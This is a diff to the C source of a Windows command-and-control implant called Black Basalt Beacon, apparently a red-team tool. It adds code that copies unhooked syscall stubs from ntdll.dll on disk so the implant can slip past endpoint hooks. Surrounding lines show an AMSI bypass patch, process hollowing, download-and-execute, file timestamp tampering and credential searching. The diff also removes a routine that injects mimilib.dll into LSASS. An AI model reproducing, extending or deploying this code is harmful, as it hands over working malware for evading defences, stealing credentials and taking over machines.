@@ -1,22 +1,3 @@
-/*
-	This file is part of Black Basalt Beacon.
-
-	Black Basalt Beacon is free software: you can redistribute it and/or modify
-	it under the terms of the GNU General Public License as published by
-	the Free Software Foundation, either version 3 of the License, or
-	(at your option) any later version.
-
-	Black Basalt Beacon is distributed in the hope that it will be useful,
-	but WITHOUT ANY WARRANTY; without even the implied warranty of
-	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-	GNU General Public License for more details.
-
-	You should have received a copy of the GNU General Public License
-	along with Black Basalt Beacon.  If not, see <https://www.gnu.org/licenses/>.
-
-	Copyright (c) LazyOwn RedTeam 2025. All rights reserved.
-*/
-
 #define PSAPI_VERSION 2
 #define WIN32_LEAN_AND_MEAN
 #include <winsock2.h>
@@ -41,11 +22,84 @@
 #include <shellapi.h>
 #include <winioctl.h>
 #include <setjmp.h>
+#include <psapi.h>
 
 #include "aes.h"
 #include "cJSON.h"
 #include "beacon.h"
 #include "COFFLoader.h"
+
+// =================================================================================================
+// NTAPI TYPE DEFINITIONS (required for NtCreateFile)
+// =================================================================================================
+#ifndef _NTDEF_
+typedef LONG NTSTATUS;
+typedef NTSTATUS *PNTSTATUS;
+#endif
+
+#ifndef _NTSTATUS_DEFINED
+#define _NTSTATUS_DEFINED
+typedef LONG NTSTATUS;
+#endif
+
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#endif
+
+typedef NTSTATUS(NTAPI* myNtResumeThread)(
+    HANDLE ThreadHandle,
+    PULONG PreviousSuspendCount
+);
+
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG Length;
+    HANDLE RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG Attributes;
+    PVOID SecurityDescriptor;
+    PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
+
+typedef struct _IO_STATUS_BLOCK {
+    union {
+        NTSTATUS Status;
+        PVOID Pointer;
+    };
+    ULONG_PTR Information;
+} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
+
+#define OBJ_CASE_INSENSITIVE 0x00000040L
+#ifndef FILE_SYNCHRONOUS_IO_NONALERT
+#define FILE_SYNCHRONOUS_IO_NONALERT 0x20
+#endif
+#define FILE_NON_DIRECTORY_FILE 0x00000040
+#define FILE_DIRECTORY_FILE 0x00000001
+
+
+// Declaraciones manuales de funciones NTAPI
+NTSYSAPI VOID NTAPI RtlInitUnicodeString(
+    PUNICODE_STRING DestinationString,
+    PCWSTR SourceString
+);
+
+NTSYSAPI ULONG NTAPI RtlNtStatusToDosError(NTSTATUS Status);
+
+// Convierte UTF-8 a wide string
+WCHAR* UTF8ToWide(const char* utf8) {
+    int len = MultiByteToWideChar(CP_UTF8, 0, utf8, -1, NULL, 0);
+    WCHAR* wide = (WCHAR*)malloc(len * sizeof(WCHAR));
+    if (wide) {
+        MultiByteToWideChar(CP_UTF8, 0, utf8, -1, wide, len);
+    }
+    return wide;
+}
+
 
 #pragma warning(disable: 4005)
 #pragma comment(lib, "secur32.lib")
@@ -220,8 +274,366 @@ const char* aes_key_hex = "36870130f03bf0bba5c8ed1d3e27117891ab415c5ea6cdbcb8731
 
 BYTE aes_key[32];
 
+// =================================================================================================
+// UNHOOKED SYSCALL STUBS
+// =================================================================================================
+#define SYSCALL_STUB_SIZE 23
 
-// User-Agents (como en tu Go)
+typedef NTSTATUS(NTAPI* myNtCreateFile)(
+    PHANDLE FileHandle,
+    ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PIO_STATUS_BLOCK IoStatusBlock,
+    PLARGE_INTEGER AllocationSize,
+    ULONG FileAttributes,
+    ULONG ShareAccess,
+    ULONG CreateDisposition,
+    ULONG CreateOptions,
+    PVOID EaBuffer,
+    ULONG EaLength
+);
+
+typedef NTSTATUS(NTAPI* myNtWriteVirtualMemory)(
+    HANDLE ProcessHandle,
+    PVOID BaseAddress,
+    PVOID Buffer,
+    SIZE_T BufferSize,
+    PSIZE_T NumberOfBytesWritten
+);
+
+typedef NTSTATUS(NTAPI* myNtProtectVirtualMemory)(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    PSIZE_T RegionSize,
+    ULONG NewProtect,
+    PULONG OldProtect
+);
+
+typedef NTSTATUS(NTAPI* myNtCreateThreadEx)(
+    PHANDLE ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    LPVOID ObjectAttributes,
+    HANDLE ProcessHandle,
+    LPTHREAD_START_ROUTINE StartRoutine,
+    LPVOID Argument,
+    ULONG CreateFlags,
+    SIZE_T ZeroBits,
+    SIZE_T StackSize,
+    SIZE_T MaximumStackSize,
+    LPVOID AttributeList
+);
+
+// Stubs globales
+myNtCreateFile g_pNtCreateFileUnhooked = NULL;
+myNtWriteVirtualMemory g_pNtWriteVirtualMemoryUnhooked = NULL;
+myNtProtectVirtualMemory g_pNtProtectVirtualMemoryUnhooked = NULL;
+myNtResumeThread g_pNtResumeThreadUnhooked = NULL;
+myNtCreateThreadEx g_pNtCreateThreadExUnhooked = NULL;
+
+// Convierte RVA a offset en archivo
+PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
+{
+    return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
+}
+
+// Encuentra y copia el stub de la syscall
+BOOL GetSyscallStub(
+    LPCSTR functionName,
+    PIMAGE_EXPORT_DIRECTORY exportDirectory,
+    LPVOID fileData,
+    PIMAGE_SECTION_HEADER textSection,
+    PIMAGE_SECTION_HEADER rdataSection,
+    LPVOID syscallStub
+) {
+    PDWORD addressOfNames = (PDWORD)RVAtoRawOffset(
+        (DWORD_PTR)fileData + exportDirectory->AddressOfNames, rdataSection);
+
+    PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset(
+        (DWORD_PTR)fileData + exportDirectory->AddressOfFunctions, rdataSection);
+
+    PWORD  addressOfNameOrdinals = (PWORD)RVAtoRawOffset(
+        (DWORD_PTR)fileData + exportDirectory->AddressOfNameOrdinals, rdataSection);
+
+    for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++)
+    {
+        DWORD_PTR nameRVA = addressOfNames[i];
+        char* name = (char*)RVAtoRawOffset((DWORD_PTR)fileData + nameRVA, rdataSection);
+
+        if (strcmp(name, functionName) == 0)
+        {
+            WORD ordinal = addressOfNameOrdinals[i];
+            DWORD functionRVA = addressOfFunctions[ordinal];
+            BYTE* functionBytes = (BYTE*)RVAtoRawOffset((DWORD_PTR)fileData + functionRVA, textSection);
+            memcpy(syscallStub, functionBytes, SYSCALL_STUB_SIZE);
+            return TRUE;
+        }
+    }
+    return FALSE;
+}
+
+// Inicializa los stubs unhooked desde disco
+BOOL InitializeUnhookedSyscalls()
+{
+    // Reservar memoria para stubs
+    char* stubCreateFile = VirtualAlloc(NULL, SYSCALL_STUB_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    char* stubWriteMem = VirtualAlloc(NULL, SYSCALL_STUB_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!stubCreateFile || !stubWriteMem) {
+        if (stubCreateFile) VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        if (stubWriteMem) VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    // Abrir y leer ntdll.dll desde disco
+    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    LPVOID fileData = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!fileData) {
+        CloseHandle(hFile);
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    DWORD bytesRead;
+    if (!ReadFile(hFile, fileData, fileSize, &bytesRead, NULL)) {
+        CloseHandle(hFile);
+        VirtualFree(fileData, 0, MEM_RELEASE);
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+    CloseHandle(hFile);
+
+    // Parsear headers
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)fileData + dosHeader->e_lfanew);
+
+    // Encontrar secciones .text y .rdata
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
+    PIMAGE_SECTION_HEADER textSection = NULL;
+    PIMAGE_SECTION_HEADER rdataSection = NULL;
+
+    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++)
+    {
+        if (strcmp((char*)section->Name, ".text") == 0)
+            textSection = section;
+        else if (strcmp((char*)section->Name, ".rdata") == 0)
+            rdataSection = section;
+    }
+
+    if (!textSection || !rdataSection) {
+        VirtualFree(fileData, 0, MEM_RELEASE);
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    // Obtener export table
+    DWORD exportRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset(
+        (DWORD_PTR)fileData + exportRVA, rdataSection);
+
+    // Extraer stub de NtCreateFile
+    if (!GetSyscallStub("NtCreateFile", exportDir, fileData, textSection, rdataSection, stubCreateFile)) {
+        VirtualFree(fileData, 0, MEM_RELEASE);
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    // Extraer stub de NtWriteVirtualMemory
+    if (!GetSyscallStub("NtWriteVirtualMemory", exportDir, fileData, textSection, rdataSection, stubWriteMem)) {
+        VirtualFree(fileData, 0, MEM_RELEASE);
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    // Extraer stub de NtProtectVirtualMemory
+    char* stubProtectMem = VirtualAlloc(NULL, SYSCALL_STUB_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!stubProtectMem) {
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    if (!GetSyscallStub("NtProtectVirtualMemory", exportDir, fileData, textSection, rdataSection, stubProtectMem)) {
+        VirtualFree(fileData, 0, MEM_RELEASE);
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        VirtualFree(stubProtectMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    DWORD oldProtect;
+    if (!VirtualProtect(stubProtectMem, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        VirtualFree(stubProtectMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    g_pNtProtectVirtualMemoryUnhooked = (myNtProtectVirtualMemory)stubProtectMem;
+
+    VirtualFree(fileData, 0, MEM_RELEASE);
+
+    // Extraer stub de NtResumeThread
+    char* stubResumeThread = VirtualAlloc(NULL, SYSCALL_STUB_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!stubResumeThread) {
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        VirtualFree(stubProtectMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    if (!GetSyscallStub("NtResumeThread", exportDir, fileData, textSection, rdataSection, stubResumeThread)) {
+        VirtualFree(fileData, 0, MEM_RELEASE);
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        VirtualFree(stubProtectMem, 0, MEM_RELEASE);
+        VirtualFree(stubResumeThread, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    if (!VirtualProtect(stubResumeThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        VirtualFree(stubProtectMem, 0, MEM_RELEASE);
+        VirtualFree(stubResumeThread, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    g_pNtResumeThreadUnhooked = (myNtResumeThread)stubResumeThread;
+
+    if (!VirtualProtect(stubCreateFile, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect) ||
+        !VirtualProtect(stubWriteMem, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+    // Extraer stub de NtCreateThreadEx
+    char* stubCreateThread = VirtualAlloc(NULL, SYSCALL_STUB_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!stubCreateThread) {
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        VirtualFree(stubProtectMem, 0, MEM_RELEASE);
+        VirtualFree(stubResumeThread, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    if (!GetSyscallStub("NtCreateThreadEx", exportDir, fileData, textSection, rdataSection, stubCreateThread)) {
+        VirtualFree(fileData, 0, MEM_RELEASE);
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        VirtualFree(stubProtectMem, 0, MEM_RELEASE);
+        VirtualFree(stubResumeThread, 0, MEM_RELEASE);
+        VirtualFree(stubCreateThread, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    if (!VirtualProtect(stubCreateThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        VirtualFree(stubProtectMem, 0, MEM_RELEASE);
+        VirtualFree(stubResumeThread, 0, MEM_RELEASE);
+        VirtualFree(stubCreateThread, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    g_pNtCreateThreadExUnhooked = (myNtCreateThreadEx)stubCreateThread;
+    // Asignar a variables globales
+    g_pNtCreateFileUnhooked = (myNtCreateFile)stubCreateFile;
+    g_pNtWriteVirtualMemoryUnhooked = (myNtWriteVirtualMemory)(LPVOID)stubWriteMem;
+
+    return TRUE;
+}
+// Wrapper para reemplazar CreateFileA con NtCreateFile unhooked
+HANDLE CreateFileA_Unhooked(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
+{
+    if (!g_pNtCreateFileUnhooked) {
+        // Fallback a CreateFileA si el stub no está disponible
+        return CreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
+    }
+
+    UNICODE_STRING fileName;
+    RtlInitUnicodeString(&fileName, UTF8ToWide(lpFileName));
+
+    OBJECT_ATTRIBUTES oa;
+    // InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    oa.Length = sizeof(OBJECT_ATTRIBUTES);
+    oa.RootDirectory = NULL;
+    oa.Attributes = OBJ_CASE_INSENSITIVE;
+    oa.ObjectName = &fileName;
+    oa.SecurityDescriptor = NULL;
+    oa.SecurityQualityOfService = NULL;
+
+    IO_STATUS_BLOCK iosb = {0};
+    HANDLE hFile = NULL;
+
+    ULONG createOptions = 0;
+    if (dwFlagsAndAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+        createOptions |= FILE_DIRECTORY_FILE;
+    }
+    if (!(dwFlagsAndAttributes & FILE_FLAG_OVERLAPPED)) {
+        createOptions |= FILE_SYNCHRONOUS_IO_NONALERT;
+    }
+
+    NTSTATUS status = g_pNtCreateFileUnhooked(
+        &hFile,
+        dwDesiredAccess,
+        &oa,
+        &iosb,
+        NULL,
+        dwFlagsAndAttributes & 0xFFFF, // FileAttributes
+        dwShareMode,
+        dwCreationDisposition,
+        createOptions,
+        NULL,
+        0
+    );
+
+    if (!NT_SUCCESS(status)) {
+        SetLastError(0); // o mapear el NTSTATUS a un código de error Win32 si lo deseas
+        return INVALID_HANDLE_VALUE;
+    }
+
+    return hFile;
+}
+// Wrapper para reemplazar WriteProcessMemory con NtWriteVirtualMemory unhooked
+BOOL WriteProcessMemory_Unhooked(
+    HANDLE hProcess,
+    LPVOID lpBaseAddress,
+    LPCVOID lpBuffer,
+    SIZE_T nSize,
+    SIZE_T* lpNumberOfBytesWritten
+) {
+    if (!g_pNtWriteVirtualMemoryUnhooked) {
+        // Fallback a WriteProcessMemory si el stub no está disponible
+        return WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
+    }
+
+    NTSTATUS status = g_pNtWriteVirtualMemoryUnhooked(
+        hProcess,
+        lpBaseAddress,
+        (PVOID)lpBuffer,
+        nSize,
+        (PSIZE_T)lpNumberOfBytesWritten
+    );
+
+    if (!NT_SUCCESS(status)) {
+        SetLastError(RtlNtStatusToDosError(status));
+        return FALSE;
+    }
+
+    return TRUE;
+}
+// User-Agents
 const char* USER_AGENTS[] = {
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -259,11 +671,7 @@ static LONG WINAPI ExceptionFilter(EXCEPTION_POINTERS *ExceptionInfo) {
 }
 
 // === ESTRUCTURAS NECESARIAS (MinGW-safe) ===
-typedef struct _UNICODE_STRING {
-    USHORT Length;
-    USHORT MaximumLength;
-    PWSTR  Buffer;
-} UNICODE_STRING, *PUNICODE_STRING;
+
 
 typedef struct _LDR_DATA_TABLE_ENTRY {
     LIST_ENTRY InMemoryOrderLinks;
@@ -395,7 +803,6 @@ void simulateLegitimateTraffic();
 void PortScanner(char* targetIP, int* ports, int numPorts);
 char* encrypt_data(const char* data);
 char* base64_encode(const unsigned char* data, size_t inputLen);
-wchar_t* UTF8ToWide(const char* utf8);
 void scanPort(void* arg);
 BOOL isValidUUID(const char* uuid);
 unsigned char* DownloadToBuffer(const char* url, DWORD* fileSize);
@@ -414,10 +821,21 @@ void handleAdversary(char* command);
 
 // === Beacon API: implementaciones exportables para BOFs ===
 
-__declspec(dllexport) void BeaconDataParse(datap * parser, char * buffer, int size) {
+__declspec(dllexport) void BeaconDataParse(datap *parser, char *buffer, int size) {
+    if (size >= 4) {
+        int32_t declared = *(int32_t *)buffer;
+        if (declared >= 0 && (declared + 4) == size) {
+            /* formato oficial: saltamos los 4 bytes de longitud */
+            parser->original = buffer;
+            parser->buffer   = buffer + 4;
+            parser->length   = declared;
+            return;
+        }
+    }
+
     parser->original = buffer;
-    parser->buffer = buffer;
-    parser->length = size;
+    parser->buffer   = buffer;
+    parser->length   = size;
 }
 
 __declspec(dllexport) char * BeaconDataPtr(datap * parser, int size) {
@@ -713,7 +1131,7 @@ BOOL ExecuteModule(PVOID moduleBase) {
 
     PVOID entryPoint = (BYTE*)moduleBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
 
-    // ✅ Ejecutar TLS callbacks antes de cualquier cosa
+    // Ejecutar TLS callbacks antes de cualquier cosa
     ExecuteTLSCallbacks(moduleBase);
 
     // === CASO 1: Tiene DllMain (DLL normal) ===
@@ -721,7 +1139,7 @@ BOOL ExecuteModule(PVOID moduleBase) {
         typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
         DllMain_t DllMain = (DllMain_t)entryPoint;
 
-        // 🔁 Primero: intentar DllMain
+        // Primero: intentar DllMain
         if (DllMain((HINSTANCE)moduleBase, DLL_PROCESS_ATTACH, NULL)) {
             printf("[+] DllMain ejecutado exitosamente\n");
             fflush(stdout);
@@ -751,126 +1169,6 @@ BOOL ExecuteModule(PVOID moduleBase) {
 BOOL LoadModuleFromURL(const char* url) {
     printf("[*] Cargando módulo desde: %s\n", url);
     fflush(stdout);
-
-    // === ¿Es mimilib.dll? → inyectar en LSASS vía LoadLibraryA ===
-    if (strstr(url, "mimilib.dll") || strstr(url, "mimikatz")) {
-        printf("[*] Módulo especial detectado: inyectando en LSASS\n");
-        fflush(stdout);
-
-        // --- 1. Anti-análisis ---
-        if (anti_analysis()) {
-            printf("[-] Entorno de análisis detectado\n");
-            fflush(stdout);
-            return FALSE;
-        }
-
-        // --- 2. Buscar PID de LSASS ---
-        DWORD lsassPid = GetProcessIdByName("lsass.exe");
-        if (lsassPid == 0) {
-            printf("[-] No se encontró LSASS\n");
-            fflush(stdout);
-            return FALSE;
-        }
-
-        printf("[+] LSASS encontrado: PID=%lu\n", lsassPid);
-        fflush(stdout);
-
-        // --- 3. Descargar DLL a disco temporal ---
-        char tempPath[MAX_PATH];
-        GetTempPathA(MAX_PATH, tempPath);
-        strcat_s(tempPath, MAX_PATH, "mimilib.dll");
-
-        DWORD fileSize = 0;
-        unsigned char* dllBuffer = DownloadToBuffer(url, &fileSize);
-        if (!dllBuffer || fileSize == 0) {
-            printf("[-] Fallo al descargar DLL\n");
-            return FALSE;
-        }
-
-        HANDLE hFile = CreateFileA(tempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-        if (hFile == INVALID_HANDLE_VALUE) {
-            printf("[-] No se pudo crear archivo temporal\n");
-            free(dllBuffer);
-            return FALSE;
-        }
-
-        DWORD written;
-        WriteFile(hFile, dllBuffer, fileSize, &written, NULL);
-        CloseHandle(hFile);
-        free(dllBuffer);
-
-        printf("[+] DLL guardada en: %s\n", tempPath);
-        fflush(stdout);
-
-        // --- 4. Abrir proceso LSASS ---
-        HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, lsassPid);
-        if (!hProcess) {
-            printf("[-] No se pudo abrir LSASS (¿PPL activo?)\n");
-            fflush(stdout);
-            return FALSE;
-        }
-
-        // --- 5. Alocar memoria para la ruta ---
-        LPVOID pRemotePath = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (!pRemotePath) {
-            printf("[-] VirtualAllocEx falló\n");
-            CloseHandle(hProcess);
-            return FALSE;
-        }
-
-        // --- 6. Escribir ruta en memoria remota ---
-        if (!WriteProcessMemory(hProcess, pRemotePath, tempPath, strlen(tempPath) + 1, NULL)) {
-            printf("[-] WriteProcessMemory falló (ruta)\n");
-            VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
-            CloseHandle(hProcess);
-            return FALSE;
-        }
-
-        // --- 7. Obtener LoadLibraryA ---
-        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-        if (!hKernel32) {
-            printf("[-] No se pudo obtener kernel32.dll\n");
-            VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
-            CloseHandle(hProcess);
-            return FALSE;
-        }
-
-        PVOID pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
-        if (!pLoadLibraryA) {
-            printf("[-] No se pudo obtener LoadLibraryA\n");
-            VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
-            CloseHandle(hProcess);
-            return FALSE;
-        }
-
-        // --- 8. Crear hilo remoto ---
-        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemotePath, 0, NULL);
-        if (!hThread) {
-            printf("[-] CreateRemoteThread falló\n");
-            VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
-            CloseHandle(hProcess);
-            return FALSE;
-        }
-
-        WaitForSingleObject(hThread, 5000);
-        CloseHandle(hThread);
-        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-
-        printf("[+] Inyección en LSASS completada: LoadLibraryA('%s')\n", tempPath);
-        fflush(stdout);
-
-        // --- 9. Verificar activación ---
-        HANDLE hLog = CreateFileA("C:\\Windows\\System32\\mimilsa.log", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
-        if (hLog != INVALID_HANDLE_VALUE) {
-            printf("[+] Éxito: mimilsa.log creado → mimilib activado\n");
-            CloseHandle(hLog);
-            return TRUE;
-        } else {
-            printf("[-] Advertencia: mimilsa.log no encontrado\n");
-            return FALSE;
-        }
-    }
 
     // === Módulo normal: cargar en memoria local ===
     DWORD fileSize = 0;
@@ -1129,7 +1427,7 @@ BOOL load_lazyconf() {
         }
 
         response[totalSize] = '\0';
-        printf("[+] ✅ Config descargada (%lu bytes): %.200s\n", totalSize, response);
+        printf("[+] Config descargada (%lu bytes): %.200s\n", totalSize, response);
 
         // PARSEAR JSON
         cJSON *root = cJSON_Parse(response);
@@ -2547,22 +2845,14 @@ char* searchCredentials(const char* basePath) {
     return results;
 }
 
-// Convierte UTF-8 a wide string
-WCHAR* UTF8ToWide(const char* utf8) {
-    int len = MultiByteToWideChar(CP_UTF8, 0, utf8, -1, NULL, 0);
-    WCHAR* wide = (WCHAR*)malloc(len * sizeof(WCHAR));
-    if (wide) {
-        MultiByteToWideChar(CP_UTF8, 0, utf8, -1, wide, len);
-    }
-    return wide;
-}
+
 
 
 // Ofusca los timestamps de un archivo
 BOOL obfuscateFileTimestamp(const char* filepath) {
     printf("[*] ofuscateFileTimestamp...\n");
     fflush(stdout);
-    HANDLE hFile = CreateFileA(filepath,
+    HANDLE hFile = CreateFileA_Unhooked(filepath,
         FILE_WRITE_ATTRIBUTES,
         0,
         NULL,
@@ -2623,7 +2913,7 @@ void obfuscateFileTimestamps(const char* basePath, int depth) {
             obfuscateFileTimestamps(filepath, depth + 1);  // Incrementar profundidad
         } else {
             if (isSensitiveFile(ffd.cFileName)) {
-                HANDLE hFile = CreateFileA(filepath,
+                HANDLE hFile = CreateFileA_Unhooked(filepath,
                     FILE_WRITE_ATTRIBUTES,
                     FILE_SHARE_READ | FILE_SHARE_WRITE,
                     NULL,
@@ -2881,7 +3171,7 @@ BOOL downloadAndExecute(const char* url, const char* targetProcess) {
 
     printf("[*] Saving downloaded payload to: %s\n", filename);
 
-    HANDLE hFile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hFile = CreateFileA_Unhooked(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         printf("[-] Cannot create file: %s (Error: %lu)\n", filename, GetLastError());
         free(payload);
@@ -3081,7 +3371,7 @@ BOOL patchAMSI(void) {
     DWORD old_protect;
     if (!VirtualProtect((LPVOID)scan_buffer_addr, 1, PAGE_EXECUTE_READWRITE, &old_protect)) { FreeLibrary(amsi_dll); return FALSE; }
     char patch[] = { 0xC3 };
-    WriteProcessMemory(GetCurrentProcess(), (LPVOID)scan_buffer_addr, patch, sizeof(patch), NULL);
+    WriteProcessMemory_Unhooked(GetCurrentProcess(), (LPVOID)scan_buffer_addr, patch, sizeof(patch), NULL);
     VirtualProtect((LPVOID)scan_buffer_addr, 1, old_protect, &old_protect);
     FreeLibrary(amsi_dll);
     return TRUE;
@@ -3303,7 +3593,7 @@ void overWrite(const char* targetPath, const char* payloadPath) {
         }
     }
     // === 1. Cargar payload ===
-    HANDLE hFile = CreateFileA(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    HANDLE hFile = CreateFileA_Unhooked(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         printf("[-] Cannot open payload: %s\n", payloadPath);
         return;
@@ -3353,8 +3643,8 @@ void overWrite(const char* targetPath, const char* payloadPath) {
 
     // === 4. Escribir payload completo ===
     SIZE_T written = 0;
-    if (!WriteProcessMemory(pi.hProcess, remoteBuffer, payloadImage, payloadImageSize, &written)) {
-        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
+    if (!WriteProcessMemory_Unhooked(pi.hProcess, remoteBuffer, payloadImage, payloadImageSize, &written)) {
+        printf("[-] WriteProcessMemory_Unhooked failed: %lu\n", GetLastError());
         TerminateProcess(pi.hProcess, 1);
